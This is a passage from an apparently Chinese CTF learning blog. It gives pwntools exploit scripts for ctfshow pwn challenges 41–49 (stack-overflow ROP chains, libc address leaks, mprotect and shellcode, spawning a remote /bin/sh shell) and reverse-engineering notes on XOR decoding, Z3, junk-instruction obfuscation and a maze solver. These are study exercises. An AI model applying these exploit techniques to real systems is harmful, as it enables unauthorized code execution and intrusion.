system(\u0026quot;/bin/sh\u0026quot;)是直接指定了系统默认的shell程序路径来执行命令,system(\u0026ldquo;sh\u0026rdquo;)则依赖系统的环境变量$PATH来寻找sh可执行文件\n1 2 3 4 5 6 7 8 9 10 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28166) elf = ELF(\u0026#39;./pwn(2)\u0026#39;) system = elf.symbols[\u0026#39;system\u0026#39;] sh = 0x080487BA payload = b\u0026#39;a\u0026#39;*(0x12+4)+p32(system)+p32(0)+p32(sh) io.sendline(payload) io.recv() io.interactive() pwn42 和前面一样，仅仅是32位和64位的区别\n1 ROPgadget --binary ./pwn 1 2 3 4 5 6 7 8 9 10 11 from pwn import * io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28139) elf=ELF(\u0026#34;pwn(3)\u0026#34;) system =elf.sym[\u0026#39;system\u0026#39;] sh =0x400872 pop_rdi =0x400843 ret = 0x40053e payload = b\u0026#39;a\u0026#39;*(0xA+8)+ p64(pop_rdi)+p64(sh)+p64(ret)+p64(system) io.sendline(payload) io.recv() io.interactive() pwn43 没有‘bin/sh’需要自己构造，先调用gets()函数，p32(gets),将gets函数的地址作为返回地址覆盖到栈上，是程序在溢出时调用gets函数，拍2\n使用pop_ebx指令将buf2的地址加载到寄存器ebx中，最后覆盖返回地址为system函数的地址\n通过覆盖返回地址，将gets函数的地址作为返回地址覆盖到栈上，使用pop_ebx指令将buf2的地址加载到寄存器ebx中，最后覆盖返回地址为system函数的地址，执行system(buf2)指向的字符串，p32(gets)将gets函数的地址作为返回地址覆盖到栈上，是程序在溢出时调用gets函数，pop_ebx用于将栈上的值弹出并存储到寄存器ebx中，buf2是一个指向存储输入数据的缓冲区的指针，p32(system)将system函数的地址作为返回地址覆盖到栈上，\u0026lsquo;aaaa\u0026rsquo;这部分是一个4字节的字符串，用于填充栈上的返回地址的剩余空间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28141) elf = ELF(\u0026#39;pwn4\u0026#39;) gets = elf.symbols[\u0026#39;gets\u0026#39;] system = elf.symbols[\u0026#39;system\u0026#39;] buf2 = 0x0804B060 pop_ebx = 0x08048409 payload = cyclic(0x6C+4)+p32(gets)+p32(pop_ebx)+p32(buf2)+p32(system)+p32(0)+p32(buf2) io.sendline(payload) io.sendline(\u0026#39;/bin/sh\u0026#39;) io.recv() io.interactive() pwn44 补充下32位和64位调用规定\n32位：参数通过栈传递，p32(system)后需要跟参数地址\n64位：前6个参数通过寄存器传递，如rdi，rsi等\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context(arch = \u0026#39;amd64\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io =remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;,28242) \\#io = process(\u0026#34;./pwn44\u0026#34;) elf =ELF(\u0026#34;pwn3\u0026#34;) system = elf.symbols[\u0026#34;system\u0026#34;] gets = elf.symbols[\u0026#34;gets\u0026#34;] pop_rdi=0x4007f3 buf2=0x602080 payload = cyclic(0xA+8)+p64(pop_rdi)+p64(buf2)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(system) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() pwn45 没有system，也没有“bin/sh”\n泄露write函数地址获取 libc 版本\n获取 system 地址与 /bin/sh 的地址\n再次执行源程序\n触发栈溢出执行 system(‘/bin/sh’)\n（可以利用puts函数）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28149) elf = ELF(\u0026#39;pwn\u0026#39;) main = elf.symbols[\u0026#39;main\u0026#39;] write_got=elf.got[\u0026#39;write\u0026#39;] write_plt=elf.plt[\u0026#39;write\u0026#39;] payload = cyclic(0x6b+4) + p32(write_plt) + p32(main) + p32(0) +p32(write_got) + p32(4) io.sendline(payload) write=u32(io.recvuntil(b\u0026#39;\\xf7\u0026#39;)[-4:]) #write在got表的地址 print(hex(write)) libc = LibcSearcher(\u0026#39;write\u0026#39;,write) libc_base=write-libc.dump(\u0026#39;write\u0026#39;) system = libc_base+libc.dump(\u0026#39;system\u0026#39;) binsh = libc_base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x6b+4)+p32(system)+p32(main)+p32(binsh) io.sendline(payload) io.recv() io.interactive() pwn47 一看直接打印地址，手动写自动脚本都行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import * # 设置目标程序 context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # 本地调试或远程连接 # io = process(\u0026#39;./vulnerable_binary\u0026#39;) # 本地 io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28266) # 远程 elf =ELF(\u0026#39;pwn6\u0026#39;) io.recvuntil(\u0026#34;puts: \u0026#34;) puts = eval(io.recvuntil(\u0026#39;\\n\u0026#39;, drop=True)) bin_sh = 0x0804B028 libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts) libc_base = puts - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x9C + 4) + p32(system) + p32(0) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() pwn48 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28103) elf =ELF(\u0026#39;pwn8\u0026#39;) main = elf.symbols[\u0026#39;main\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] io.recvuntil(\u0026#34;O.o?\u0026#34;) payload = cyclic(0x6b+4)+p32(puts_plt)+p32(main)+p32(puts_got) io.sendline(payload) puts = u32(io.recvuntil(b\u0026#39;\\xf7\u0026#39;)[-4:]) print(hex(puts)) libc =LibcSearcher(\u0026#39;puts\u0026#39;,puts) libc_base = puts-libc.dump(\u0026#39;puts\u0026#39;) binsh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) payload = cyclic(0x6b+4)+p32(system)+p32(main)+p32(binsh) io.sendline(payload) io.recv() io.interactive() 总算明白了payloa的区别了\npayload = cyclic(0x9C+4)+p32(puts_plt)+p32(0)+p32(puts_got)+p32(4)\n返回地址0，令程序崩溃，泄露puts地址后程序崩溃\npayload = cyclic(0x9C+4)+p32(puts_plt)+p32(main)+p32(puts_got)\n返回main函数，程序继续运行\npwn49 mprotect函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28263) elf =ELF(\u0026#39;pwn49\u0026#39;) mprotect = elf.symbols[\u0026#39;mprotect\u0026#39;] read=0x0806BEE0 pop_ebx_esi_ebp_ret =0x080a019b addr=0x080DA000 size=0x2000 proc=0x7 payload=cyclic(0x12+4)+p32(mprotect) payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)+p32(read)+p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr) io.sendline(payload) shellcode = asm(shellcraft.sh()) io.send(shellcode) #用于生成一个执行/bin/sh io.recv() io.interactive() ","date":"2025-03-15T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow-pwn/","title":"ctfshow-pwn"},{"content":"一些常见的逆向函数 index() find()找索引值\n.append(ord()) +=chr()字母数字转换\n简简单单的逻辑题 1 2 3 4 5 6 ord 字符串转ascii码 chr ascii码转字符串 hex 十进制转十六进制 int(a，16) 十六进制转十进制 [起点,终点,步长] python切片 zfill(2) 为不满2个宽度的字符串前添加0直到宽度为2 easy C 直接逆完事\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char b[] = \u0026#34;d`vxbQd\u0026#34;; for (int i = 0; i \u0026lt; 7; i++) { ​ b[i] = b[i] ^ 2; ​ b[i]--; } printf(\u0026#34;%s\\n\u0026#34;, b); } 有点小难的逻辑题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 flag = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; result = \u0026#39;\u0026#39; for i in range(len(flag)): s1 = ord(flag[2*i]) s2 = ord(flag[2*i+1]) result += s[(s1+i)%34]+s[-(s2+i+1)%34] print(result) \\# result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #爆破脚本，菜狗不会逆向 result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; flag = \u0026#39;\u0026#39; l=range(len(result)//2) #先找到s中的索引值 for i in l: indx1 = s.index(result[2*i]) indx2 = s.index(result[2*i+1]) for num in range(32,127): ​ s1 = num //17 ​ s2 = num % 17 ​ ds1 = (s1+i)%34 ​ ds2 = -(s2+i+1)%34 ​ if indx1 == ds1 and indx2 == ds2: ​ flag += chr(num) ​ break print(flag) 思路：其实从s到result从分析学来看，就是一个数列重排，flag被用作一个对应的函数关系式，只要一一验证result和s的值在哪个地方相等，就可以求出flag，index()就是找result中的值在s的哪个位置，这个index再经过逆向/爆破，可以得到flag\nfakerandom random.seed()：通过设置相同的随机种子，可以确保每次运行时获得相同的随机数序列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import random flag = \u0026#39;xxxxxxxxxxxxxxxxxxxx\u0026#39; random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) result=[] for i in range(len(l)): random.seed(l[i]) for n in range(5): ​ result.append(ord(flag[i*5+n])^random.getrandbits(8)) print(result) \\# result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import random result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] flag = [] random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) print(l) for i in range(len(l)): random.seed(l[i]) for n in range(5): ​ flag.append((chr((result[i*5+n])^random.getrandbits(8)))) flag = \u0026#39;\u0026#39;.join(flag) print(flag) 卡在签到题了\u0026hellip; if ( Str2[j] == 111 ) Str2[j] = 48; 看到有个很像flag的{hello_world},提交结果发现错了，一看伪代码，发现把0改成了o，ASCII表o对应111，0对应48\n花指令 jump\n1 2 3 4 5 6 7 8 9 10 start://花指令开始 jmp label1 DB junkcode label1: jmp label2 DB junkcode label2： jmp label3 DB junkcode label3 jnz和jz跳转\n1 2 3 4 5 6 _asm{ jz label1 jnz label1 db junkcode label1: } 永真条件跳转 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __asm{ push ebx xor ebx,ebx test ebx,ebx jnz label1 jz label2 label1: _emit junkcode label2: pop ebx//需要恢复ebx寄存器 } __asm{ clc jnz label1: _emit junkcode label1: } call\u0026amp;ret构造花指令 1 2 3 4 5 6 7 8 9 10 11 __asm{ call label1 _emit junkcode label1: add dword ptr ss:[esp],8//具体增加多少根据调试来 ret _emit junkcode } call指令：将下一条指令地址压入栈，再跳转执行 ret指令：将保存的地址取出，跳转执行 例题\n按D转换成数据形式\n右键change bytes E8换成90 就是nop\n后面变黄的地址c修复即可\n转到函数开头p生成函数\n[HUBUCTF 2022 新生赛]ezPython 拿到题目，发现文件时.pyz结尾，先转换成py格式\nuncompyle 6 -o ezPython.py ezPython.pyz\n1 2 3 4 5 6 7 8 9 10 from Crypto.Util.number import * import base64, base58 password = open(\u0026#34;password.txt\u0026#34;, \u0026#34;r\u0026#34;).read() tmp = bytes_to_long(password.encode(\u0026#34;utf-8\u0026#34;)) ans = base64.b64encode(base58.b58encode(str(tmp))).decode() print(\u0026#34;I\u0026#39;ve forgot my password,could you please help me find the password?\u0026#34;) if ans == \u0026#34;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==\u0026#34;: print(\u0026#34;You get the password!\u0026#34;) else: print(\u0026#34;Wrong! try again\u0026#34;) 解释下，bytes_to_long()把字节转换成长整型，加密成utf-8形式，再转为字符串，转为base58，转为base64，逆过来写就行\n1 2 3 4 5 6 7 8 9 10 11 12 from Crypto.Util.number import * import base64 import base58 import hashlib flag1=\u0026#34;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==\u0026#34; flag= int(base58.b58decode(base64.b64decode(flag1))) print(flag) flag = long_to_bytes(flag) flag.decode(\u0026#34;utf-8\u0026#34;) flag = hashlib.md5(flag).hexdigest() print(flag) 一些习惯：打开IDAshift f12查看字符串\nctrl+x 交叉引用\nZ3-slover Solver()\n创建一个求解器，在里面添加约束条件进行下一步的求解\nadd()\n通常在solver()命令之后，用来添加约束条件，通常添加的约束条件是一个等式\ncheck()\n判断是否添加的约束条件是否有解，有解返回sat，无解返回unsat\nmodel()\n在有解的情况下，求解的交集再输出创建求解约束器\n1 solver = Solver 添加约束条件\n1 solver.add() 判断解是否存在\n1 if solver.check()==sat 求解\n1 print solver.model() 题目\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; using namespace std; void flag_checker(int v, int w,int x,int y,int z); int main(){ int v,w,x,y,z; cout \u0026lt;\u0026lt; \u0026#34;Input 5 random number and check your luck ;)\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Num1: \u0026#34;; cin \u0026gt;\u0026gt; v; cout \u0026lt;\u0026lt; \u0026#34;Num2: \u0026#34;; cin \u0026gt;\u0026gt; w; cout \u0026lt;\u0026lt; \u0026#34;Num3: \u0026#34;; cin \u0026gt;\u0026gt; x; cout \u0026lt;\u0026lt; \u0026#34;Num4: \u0026#34;; cin \u0026gt;\u0026gt; y; cout \u0026lt;\u0026lt; \u0026#34;Num5: \u0026#34;; cin \u0026gt;\u0026gt; z; cout \u0026lt;\u0026lt; endl; flag_checker(v,w,x,y,z); } void flag_checker(int v,int w, int x, int y, int z){ if ((v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322) \u0026amp;\u0026amp; (v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724) \u0026amp;\u0026amp; (v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529) \u0026amp;\u0026amp; (v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457) \u0026amp;\u0026amp; (v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367)){ cout \u0026lt;\u0026lt; \u0026#34;Congratulations, Here is your flag:\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;flag{\u0026#34; \u0026lt;\u0026lt; v \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; w \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; y \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; z \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl; } else{ cout \u0026lt;\u0026lt; \u0026#34;\\nSeems your luck is not in favor right now!\\nBetter luck next time!\u0026#34; \u0026lt;\u0026lt; endl; } } 1 2 3 4 5 6 7 8 9 10 from z3 import * s=Solver() v,w,x,y,z=Ints(\u0026#39;v w x y z\u0026#39;) #定义整数变量 s.add(v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322) s.add(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724) s.add(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529) s.add(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457) s.add(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367) s.check() print(s.model()) [SWPUCTF 2022 新生赛]xor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char str[] = \u0026#34;LQQAVDyZMP]3q]emmf]uc{]vm]glap{rv]dnce\u0026#34;; char flag[39]; for (int i = 0; i \u0026lt;= 38; i++) { ​ flag[i] = str[i] ^ 2; } printf(\u0026#34;%s\u0026#34;, flag); } easyasm cmp [ebp+i], eax\njge short loc_40119D （大于等于）\n最主要是这两行，以及[ebp+i]一开始赋值为0\neax没有初始化，我想第一次循环是不会直接跳，所以继续执行后面的内容，看到xor eax, 33h，知道和55作异或运算，逆过来就是把明文每个作XOR运算\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ; void __cdecl enc(char *p) .text:00401160 _enc proc near ; CODE XREF: _main+1B↑p .text:00401160 .text:00401160 i = dword ptr -4 .text:00401160 Str = dword ptr 8 .text:00401160 .text:00401160 push ebb .text:00401161 mov ebp, esp .text:00401163 push ecx .text:00401164 mov [ebp+i], 0 .text:0040116B jmp short loc_401176 .text:0040116D ; --------------------------------------------------------------------------- .text:0040116D .text:0040116D loc_40116D: ; CODE XREF: _enc+3B↓j .text:0040116D mov eax, [ebp+i] .text:00401170 add eax, 1 .text:00401173 mov [ebp+i], eax .text:00401176 .text:00401176 loc_401176: ; CODE XREF: _enc+B↑j .text:00401176 mov ecx, [ebp+Str] .text:00401179 push ecx ; Str .text:0040117A call _strlen .text:0040117F add esp, 4 .text:00401182 cmp [ebp+i], eax .text:00401185 jge short loc_40119D .text:00401187 mov edx, [ebp+Str] .text:0040118A add edx, [ebp+i] .text:0040118D movsx eax, byte ptr [edx] .text:00401190 xor eax, 33h .text:00401193 mov ecx, [ebp+Str] .text:00401196 add ecx, [ebp+i] .text:00401199 mov [ecx], al .text:0040119B jmp short loc_40116D .text:0040119D ; --------------------------------------------------------------------------- .text:0040119D .text:0040119D loc_40119D: ; CODE XREF: _enc+25↑j .text:0040119D mov esp, ebp .text:0040119F pop ebp .text:004011A0 retn .text:004011A0 _enc endp Input: your flag Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char flag1[] = {0x5b, 0x54, 0x52, 0x5e, 0x56, 0x48, 0x44, 0x56, 0x5f, 0x50, 0x3, 0x5e, 0x56, 0x6c, 0x47, 0x3, 0x6c, 0x41, 0x56, 0x6c, 0x44, 0x5c, 0x41, 0x2, 0x57, 0x12, 0x4e}; char flag[100] = {0}; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag[i] = flag1[i] ^ 51; } printf(\u0026#34;%s\\n\u0026#34;, flag); } 你知道什么事python吗 1 2 3 4 5 6 7 8 9 10 11 12 13 14 s = str(input(\u0026#34;please input your flag:\u0026#34;)) arr=[29, 0, 16, 23, 18, 61, 43, 41, 13, 28, 88, 94, 49, 110, 66, 44, 43, 28, 91, 108, 61, 7, 22, 7, 43, 51, 44, 46, 9, 18, 20, 6, 2, 24] if(len(s)!=35 or s[0]!=\u0026#39;N\u0026#39;): print(\u0026#34;error\u0026#34;) exit(0) for i in range(1,len(s)): if(ord(s[i-1])^ord(s[i])!=arr[i-1]): print(\u0026#34;error!\u0026#34;) exit(0) print(\u0026#34;right!\u0026#34;) 1 2 3 4 5 6 arr=[29, 0, 16, 23, 18, 61, 43, 41, 13, 28, 88, 94, 49, 110, 66, 44, 43, 28, 91, 108, 61, 7, 22, 7, 43, 51, 44, 46, 9, 18, 20, 6, 2, 24] s = [\u0026#39;\u0026#39;] * 35 s[0]=\u0026#39;N\u0026#39; for i in range(1,len(arr)+1): s[i]=chr(ord(s[i-1])^arr[i-1]) print(\u0026#34;\u0026#34;.join(s)) s=[\u0026rsquo;\u0026rsquo;]*35 分配初始空间\nord()转换成ascii码\nchr()转换成字符\nprint(\u0026quot;\u0026quot;.join(s))拼接\n安卓逆向 java -jar jadx-1.5.1-all.jar\n文件拖进来\n搜索字符串‘NO’\n1 2 3 4 5 6 7 8 9 10 11 12 13 text = \u0026#39;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌\u0026#39; key = 987654321 flag = \u0026#39;\u0026#39; for i in text: \\# 将结果限制在有效的 Unicode 范围内，限制在0-255范围内 flag += chr((ord(i) ^ key) % 256) print(flag) 注意限制字符长度！\nchicken_soup 花指令 E8改成90 p生成函数\n%c直接转为ASCII码，c语言这点比python好\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { unsigned char a1[] = {0xCD, 0x4D, 0x8C, 0x7D, 0xAD, 0x1E, 0xBE, 0x4A, 0x8A, 0x7D, 0xBC, 0x7C, 0xFC, 0x2E, 0x2A, 0x79, 0x9D, 0x6A, 0x1A, 0xCC, 0x3D, 0x4A, 0xF8, 0x3C, 0x79, 0x69, 0x39, 0xD9, 0xDD, 0x9D, 0xA9, 0x69, 0x4C, 0x8C, 0xDD, 0x59, 0xE9, 0xD7}; for (int i = 0; i \u0026lt; 38; i++) { a1[i] = (16 * a1[i]) | (a1[i] \u0026gt;\u0026gt; 4); } for (int j = 36; j \u0026gt; 0; j--) { a1[j] -= a1[j + 1]; } for (int i = 0; i \u0026lt; 38; i++) { printf(\u0026#34;%c\u0026#34;, a1[i]); } return 0; } 关了IDA忘记截图，索性拿别人wp\n老鼠走迷宫 难崩，Windows环境有点难配\nconda activate 2-27进入python3.6版本的conda环境，进入D盘目录pyinstxtractor\npython pyinstxtractor.py 附件.exe\n用struct.pyc修复5.pyc头文件\n进入D盘pydcd的build\npycdc.exe 5.pyc\n脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 from collections import deque #设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可 (row, col) = (12, 12) (i, j) = (0, 0) maze = [ [ 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1], [ 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]] path_len = 0x7fffffff#如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度，否则请保留path_len的极大值 #进行BFS寻找路径 def bfs(start, end, barrier): directions = [(0, 1), (1, 0), (0, -1), (-1, 0)] # 定义四个方向的移动 for i in range(len(maze)):#获取起点和终点在列表中的索引 for j in range(len(maze[i])): if(maze[i][j] == start): start = (i, j) if(maze[i][j] == end): end = (i, j) #以下均是bfs算法套路 queue = deque() queue.append((start, [start])) # (当前位置, 路径) visited = set() visited.add(start) while queue: position, path = queue.popleft() if position == end: return path elif len(path)==path_len: return path for d in directions: next_position = (position[0] + d[0], position[1] + d[1]) if 0 \u0026lt;= next_position[0] \u0026lt; len(maze) and 0 \u0026lt;= next_position[1] \u0026lt; len(maze[0]) and \\ maze[next_position[0]][next_position[1]] != barrier and next_position not in visited: queue.append((next_position, path + [next_position])) visited.add(next_position) return None #执行BFS搜索并打印结果 if __name__ == \u0026#39;__main__\u0026#39;: maze[0][1] = \u0026#39;S\u0026#39; #如果题目给了起点终点的坐标，在这里直接给起点和终点添加特征 maze[24][23] = \u0026#39;E\u0026#39; path = bfs(\u0026#39;S\u0026#39;, \u0026#39;E\u0026#39;, 1) #bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如\u0026#39;#\u0026#39;) print(\u0026#34;移动路径坐标：\u0026#34;, path) print(\u0026#34;移动路径方位：{\u0026#34;, end=\u0026#39;\u0026#39;) for i in range(1 ,len(path)): x1, y1, x2, y2 = path[i - 1][0], path[i - 1][1], path[i][0], path[i][1] if(x1 